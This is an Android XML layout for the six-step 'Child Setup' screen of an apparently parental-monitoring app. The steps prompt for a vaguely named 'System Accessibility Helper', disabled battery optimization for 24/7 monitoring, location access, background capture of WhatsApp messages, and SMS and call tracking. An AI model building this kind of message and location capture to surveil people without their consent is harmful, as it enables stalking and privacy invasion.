<?xml version="1.0" encoding="utf-8"?>
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#0F0F0F">

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:padding="20dp">

        <!-- Header -->
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="🛡 Child Setup"
            android:textSize="26sp"
            android:textStyle="bold"
            android:textColor="#FFFFFF"
            android:layout_marginTop="24dp"/>

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Complete all steps to activate monitoring"
            android:textSize="13sp"
            android:textColor="#8A8A8A"
            android:layout_marginTop="4dp"
            android:layout_marginBottom="24dp"/>

        <!-- Step 1: Parent ID -->
        <com.google.android.material.card.MaterialCardView
            android:id="@+id/cardParentId"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginBottom="12dp"
            app:cardCornerRadius="14dp"
            app:cardElevation="0dp"
            app:cardBackgroundColor="#1E1E1E">

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:padding="18dp">

                <LinearLayout
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:orientation="horizontal"
                    android:gravity="center_vertical">

                    <TextView
                        android:layout_width="0dp"
                        android:layout_height="wrap_content"
                        android:layout_weight="1"
                        android:text="Step 1 — Parent Code"
                        android:textSize="15sp"
                        android:textStyle="bold"
                        android:textColor="#FFFFFF"/>

                    <TextView
                        android:id="@+id/tvStep1Status"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="⬜ Pending"
                        android:textSize="12sp"
                        android:textColor="#757575"/>
                </LinearLayout>

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="Enter the code from the parent's phone"
                    android:textSize="12sp"
                    android:textColor="#8A8A8A"
                    android:layout_marginTop="4dp"
                    android:layout_marginBottom="12dp"/>

                <EditText
                    android:id="@+id/etParentId"
                    android:layout_width="match_parent"
                    android:layout_height="46dp"
                    android:hint="Enter Parent Code"
                    android:textColorHint="#555555"
                    android:textColor="#FFFFFF"
                    android:textSize="14sp"
                    android:padding="12dp"
                    android:background="@drawable/bg_input_dark"
                    android:inputType="textCapCharacters"/>

                <Button
                    android:id="@+id/btnSaveParentId"
                    android:layout_width="match_parent"
                    android:layout_height="46dp"
                    android:layout_marginTop="12dp"
                    android:text="Save ID"
                    android:backgroundTint="#4DA6FF"
                    android:textColor="#FFFFFF"/>

            </LinearLayout>
        </com.google.android.material.card.MaterialCardView>

        <!-- Step 2: Accessibility -->
        <com.google.android.material.card.MaterialCardView
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginBottom="12dp"
            app:cardCornerRadius="14dp"
            app:cardElevation="0dp"
            app:cardBackgroundColor="#1E1E1E">

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:padding="18dp">

                <LinearLayout
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:orientation="horizontal"
                    android:gravity="center_vertical">

                    <TextView
                        android:layout_width="0dp"
                        android:layout_height="wrap_content"
                        android:layout_weight="1"
                        android:text="Step 2 — Accessibility"
                        android:textSize="15sp"
                        android:textStyle="bold"
                        android:textColor="#FFFFFF"/>

                    <TextView
                        android:id="@+id/tvStep2Status"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="⬜ Pending"
                        android:textSize="12sp"
                        android:textColor="#757575"/>
                </LinearLayout>

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="Enable System Accessibility Helper"
                    android:textSize="12sp"
                    android:textColor="#8A8A8A"
                    android:layout_marginTop="4dp"
                    android:layout_marginBottom="12dp"/>

                <Button
                    android:id="@+id/btnEnableAccessibility"
                    android:layout_width="match_parent"
                    android:layout_height="46dp"
                    android:text="Open Accessibility Settings"
                    android:backgroundTint="#2A2A2A"
                    android:textColor="#FFFFFF"/>
            </LinearLayout>
        </com.google.android.material.card.MaterialCardView>

        <!-- Step 3: Battery -->
        <com.google.android.material.card.MaterialCardView
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginBottom="12dp"
            app:cardCornerRadius="14dp"
            app:cardElevation="0dp"
            app:cardBackgroundColor="#1E1E1E">

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:padding="18dp">

                <LinearLayout
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:orientation="horizontal"
                    android:gravity="center_vertical">

                    <TextView
                        android:layout_width="0dp"
                        android:layout_height="wrap_content"
                        android:layout_weight="1"
                        android:text="Step 3 — Battery"
                        android:textSize="15sp"
                        android:textStyle="bold"
                        android:textColor="#FFFFFF"/>

                    <TextView
                        android:id="@+id/tvStep3Status"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="⬜ Pending"
                        android:textSize="12sp"
                        android:textColor="#757575"/>
                </LinearLayout>

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="Disable battery optimization for 24/7 monitoring"
                    android:textSize="12sp"
                    android:textColor="#8A8A8A"
                    android:layout_marginTop="4dp"
                    android:layout_marginBottom="12dp"/>

                <Button
                    android:id="@+id/btnBatteryOptimization"
                    android:layout_width="match_parent"
                    android:layout_height="46dp"
                    android:text="Disable Battery Optimization"
                    android:backgroundTint="#2A2A2A"
                    android:textColor="#FFFFFF"/>
            </LinearLayout>
        </com.google.android.material.card.MaterialCardView>

        <!-- Step 4: Location -->
        <com.google.android.material.card.MaterialCardView
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginBottom="12dp"
            app:cardCornerRadius="14dp"
            app:cardElevation="0dp"
            app:cardBackgroundColor="#1E1E1E">

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:padding="18dp">

                <LinearLayout
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:orientation="horizontal"
                    android:gravity="center_vertical">

                    <TextView
                        android:layout_width="0dp"
                        android:layout_height="wrap_content"
                        android:layout_weight="1"
                        android:text="Step 4 — Location"
                        android:textSize="15sp"
                        android:textStyle="bold"
                        android:textColor="#FFFFFF"/>

                    <TextView
                        android:id="@+id/tvStep4Status"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="⬜ Pending"
                        android:textSize="12sp"
                        android:textColor="#757575"/>
                </LinearLayout>

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="Share location for emergency tracking"
                    android:textSize="12sp"
                    android:textColor="#8A8A8A"
                    android:layout_marginTop="4dp"
                    android:layout_marginBottom="12dp"/>

                <Button
                    android:id="@+id/btnEnableLocation"
                    android:layout_width="match_parent"
                    android:layout_height="46dp"
                    android:text="Grant Location Access"
                    android:backgroundTint="#2A2A2A"
                    android:textColor="#FFFFFF"/>
            </LinearLayout>
        </com.google.android.material.card.MaterialCardView>

        <!-- Step 5: Notification -->
        <com.google.android.material.card.MaterialCardView
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginBottom="12dp"
            app:cardCornerRadius="14dp"
            app:cardElevation="0dp"
            app:cardBackgroundColor="#1E1E1E">

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:padding="18dp">

                <LinearLayout
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:orientation="horizontal"
                    android:gravity="center_vertical">

                    <TextView
                        android:layout_width="0dp"
                        android:layout_height="wrap_content"
                        android:layout_weight="1"
                        android:text="Step 5 — Notification Access"
                        android:textSize="15sp"
                        android:textStyle="bold"
                        android:textColor="#FFFFFF"/>

                    <TextView
                        android:id="@+id/tvStep5Status"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="⬜ Pending"
                        android:textSize="12sp"
                        android:textColor="#757575"/>
                </LinearLayout>

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="Capture WhatsApp messages in background"
                    android:textSize="12sp"
                    android:textColor="#8A8A8A"
                    android:layout_marginTop="4dp"
                    android:layout_marginBottom="12dp"/>

                <Button
                    android:id="@+id/btnEnableNotification"
                    android:layout_width="match_parent"
                    android:layout_height="46dp"
                    android:text="Grant Notification Access"
                    android:backgroundTint="#2A2A2A"
                    android:textColor="#FFFFFF"/>
            </LinearLayout>
        </com.google.android.material.card.MaterialCardView>

        <!-- Step 6: SMS & Calls -->
        <com.google.android.material.card.MaterialCardView
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginBottom="12dp"
            app:cardCornerRadius="14dp"
            app:cardElevation="0dp"
            app:cardBackgroundColor="#1E1E1E">

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:padding="18dp">

                <LinearLayout
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:orientation="horizontal"
                    android:gravity="center_vertical">

                    <TextView
                        android:layout_width="0dp"
                        android:layout_height="wrap_content"
                        android:layout_weight="1"
                        android:text="Step 6 — SMS &amp; Calls"
                        android:textSize="15sp"
                        android:textStyle="bold"
                        android:textColor="#FFFFFF"/>

                    <TextView
                        android:id="@+id/tvStep6Status"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="⬜ Pending"
                        android:textSize="12sp"
                        android:textColor="#757575"/>
                </LinearLayout>

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="Track incoming SMS and phone calls"
                    android:textSize="12sp"
                    android:textColor="#8A8A8A"
                    android:layout_marginTop="4dp"
                    android:layout_marginBottom="12dp"/>

                <Button
                    android:id="@+id/btnEnableSmsCalls"
                    android:layout_width="match_parent"
                    android:layout_height="46dp"
                    android:text="Grant SMS &amp; Call Access"
                    android:backgroundTint="#2A2A2A"
                    android:textColor="#FFFFFF"/>
            </LinearLayout>
        </com.google.android.material.card.MaterialCardView>

        <!-- Status Banner -->
        <com.google.android.material.card.MaterialCardView
            android:id="@+id/cardStatus"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginTop="4dp"
            android:layout_marginBottom="24dp"
            app:cardCornerRadius="14dp"
            app:cardElevation="0dp"
            app:cardBackgroundColor="#1A1A1A">

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:padding="20dp"
                android:gravity="center">

                <TextView
                    android:id="@+id/tvFinalStatus"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="⚠ Setup Incomplete"
                    android:textSize="15sp"
                    android:textStyle="bold"
                    android:textColor="#FFFFFF"/>

                <TextView
                    android:id="@+id/tvFinalSubtext"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="Complete all 6 steps above"
                    android:textSize="12sp"
                    android:textColor="#8A8A8A"
                    android:layout_marginTop="4dp"/>

            </LinearLayout>
        </com.google.android.material.card.MaterialCardView>

    </LinearLayout>
</ScrollView>
